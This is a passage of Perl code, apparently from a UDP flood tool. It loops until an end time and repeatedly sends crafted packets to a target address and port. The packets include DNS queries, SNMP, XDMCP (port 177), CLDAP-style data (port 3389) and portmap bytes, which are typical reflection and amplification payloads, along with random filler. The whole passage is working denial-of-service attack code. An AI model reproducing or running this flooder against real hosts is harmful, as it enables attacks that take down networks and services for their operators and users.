...
for (;time() <= $endtime;) {
	...
	$hexed3 = $hex[rand @hex];
	$hexed4 = $hex[rand @hex];
	send("flood", "\x0D\x0A\x0D\x0A", 0, pack_sockaddr_in("$port", $iaddr));
    send("flood", $hexed . $hexed . "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01", 0, pack_sockaddr_in("$port", $iaddr));
	send("flood", $hexed . $hexed . "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", 0, pack_sockaddr_in("$port", $iaddr));
	send("flood", "\x72\xFE\x1D\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x01\x97\x7C\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 0, pack_sockaddr_in("53", $iaddr));
	send("flood", "\xd9\x00\x0a\xfa\x00\x00\x00\x00\x00\x01\x02\x90\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc5\x02\x04\xec\xec\x42\xee\x92", 0, pack_sockaddr_in("53", $iaddr));
	send("flood", "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01", 0, pack_sockaddr_in("$port", $iaddr));
	send("flood", $hexed2 . $hexed1 . $hexed3 . $hexed4 . $hexed . $hexed . $hexed1 . $hexed2 . $hexed3 . $hexed4 . $hexed . $hexed . $hexed . $hexed, 0, pack_sockaddr_in("$port", $iaddr));
	send("flood", "\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00", 0, pack_sockaddr_in("$port", $iaddr));
	send("flood", "\x00\x01\x00\x02\x00\x01\x00", 0, pack_sockaddr_in("177", $iaddr));
	send("flood", "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", 0, pack_sockaddr_in("3389", $iaddr));
